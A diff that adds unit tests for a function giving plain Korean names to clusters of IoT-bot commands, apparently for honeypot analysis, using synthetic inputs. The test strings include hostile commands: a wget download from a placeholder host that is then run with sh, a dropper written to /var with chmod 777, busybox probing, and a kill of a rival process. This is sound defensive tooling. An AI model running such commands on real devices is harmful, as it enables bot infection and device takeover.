@@ -39,5 +39,19 @@ class NovelViewTests(unittest.TestCase):
         self.assertTrue(P.novel_view(ml, sc).empty)
 
 
+class PlainTitleTests(unittest.TestCase):
+    """쉬운 군집 이름. 합성 입력만 쓴다(실제 로그 아님)."""
+
+    def test_titles(self):
+        t = P.plain_title
+        self.assertEqual(t('sh ; shell ; enable ; system', []), '명령창만 열어 보는 단순 접속')
+        self.assertEqual(t('sh ; /bin/busybox ABCD ; cat /proc/self/exe', []), 'IoT 장비 종류를 확인하는 봇')
+        self.assertEqual(t('>/var/.f ; chmod 777 /var/.f ; /var/.f', ['B11']), '쓰고 실행할 수 있는 폴더를 찾는 봇')
+        self.assertEqual(t('cd /tmp ; wget http://x/y ; sh y', []), '파일을 내려받아 실행하려는 시도')
+        self.assertEqual(t('kill -9 123', ['B12']), '다른 악성 프로그램을 몰아내고 자리 잡으려는 봇')
+        self.assertEqual(t('anything', [], is_noise=True), '어느 유형에도 안 맞는 입력')
+        self.assertIsNone(t('foo ; bar', []))
+
+
 if __name__ == '__main__':
     unittest.main()
